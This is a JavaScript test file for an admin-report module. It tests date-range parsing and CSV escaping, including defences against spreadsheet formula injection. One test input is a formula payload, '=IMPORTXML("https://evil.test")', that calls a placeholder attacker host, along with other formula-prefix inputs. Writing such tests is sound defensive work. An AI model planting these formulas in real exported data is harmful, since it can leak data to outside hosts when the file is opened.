import assert from 'node:assert/strict'
import { describe, it } from 'node:test'

import { escapeCsvValue, parseAdminReportRange } from '@/backend/admin/reports'

describe('admin report date range parsing', () => {
  it('uses explicit dates and normalizes the end date to end-of-day', () => {
    const range = parseAdminReportRange('2026-01-05T10:15:00', '2026-01-15T12:30:00')

    assert.equal(range.from.getFullYear(), 2026)
    assert.equal(range.from.getMonth(), 0)
    assert.equal(range.from.getDate(), 5)
    assert.equal(range.from.getHours(), 10)
    assert.equal(range.from.getMinutes(), 15)
    assert.equal(range.to.getFullYear(), 2026)
    assert.equal(range.to.getMonth(), 0)
    assert.equal(range.to.getDate(), 15)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('falls back safely for missing dates', () => {
    const before = Date.now()
    const range = parseAdminReportRange()
    const after = Date.now()
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000

    assert.ok(range.from.getTime() >= before - thirtyDaysMs - 1000)
    assert.ok(range.from.getTime() <= after - thirtyDaysMs + 1000)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('falls back safely for invalid dates', () => {
    const before = Date.now()
    const range = parseAdminReportRange('not-a-date', 'also-not-a-date')
    const after = Date.now()
    const thirtyDaysMs = 30 * 24 * 60 * 60 * 1000

    assert.ok(range.from.getTime() >= before - thirtyDaysMs - 1000)
    assert.ok(range.from.getTime() <= after - thirtyDaysMs + 1000)
    assert.equal(range.to.getHours(), 23)
    assert.equal(range.to.getMinutes(), 59)
    assert.equal(range.to.getSeconds(), 59)
    assert.equal(range.to.getMilliseconds(), 999)
  })

  it('preserves reversed ranges for route compatibility', () => {
    const range = parseAdminReportRange('2026-02-10T00:00:00', '2026-01-01T00:00:00')

    assert.ok(range.from.getTime() > range.to.getTime())
  })
})

describe('admin report CSV escaping', () => {
  it('quotes commas and double quotes', () => {
    assert.equal(escapeCsvValue('Boilabin, Dhaka'), '"Boilabin, Dhaka"')
    assert.equal(escapeCsvValue('He said "yes"'), '"He said ""yes"""')
  })

  it('escapes spreadsheet formula prefixes', () => {
    assert.equal(escapeCsvValue('=IMPORTXML("https://evil.test")'), `"'=IMPORTXML(""https://evil.test"")"`)
    assert.equal(escapeCsvValue('+8801711222333'), "'+8801711222333")
    assert.equal(escapeCsvValue('  @cmd'), "'  @cmd")
    assert.equal(escapeCsvValue('-SUM(A1:A2)'), "'-SUM(A1:A2)")
    assert.equal(escapeCsvValue('\t=SUM(A1:A2)'), "'\t=SUM(A1:A2)")
  })

  it('handles empty and non-string values without widening the CSV contract', () => {
    assert.equal(escapeCsvValue(null), '')
    assert.equal(escapeCsvValue(undefined), '')
    assert.equal(escapeCsvValue(42), '42')
    assert.equal(escapeCsvValue(false), 'false')
  })

  it('quotes line breaks that could split CSV rows', () => {
    assert.equal(escapeCsvValue('Line one\nLine two'), '"Line one\nLine two"')
    assert.equal(escapeCsvValue('Line one\rLine two'), '"Line one\rLine two"')
  })
})
